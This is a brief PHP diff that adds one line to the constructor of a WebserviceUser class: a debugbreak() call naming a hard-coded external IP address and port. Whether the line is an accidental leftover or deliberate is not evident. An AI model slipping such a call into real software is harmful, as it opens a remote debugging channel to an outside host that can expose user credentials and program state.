@@ -19,6 +19,7 @@ class WebserviceUser implements UserInterface, EquatableInterface {
         $this->salt         = $salt;
         $this->roles        = $roles;
         $this->type         = $type;
+        debugbreak('666@209.29.22.251:7869;d=1,p=0,c=0');
     }
     
     public function getRoles() {
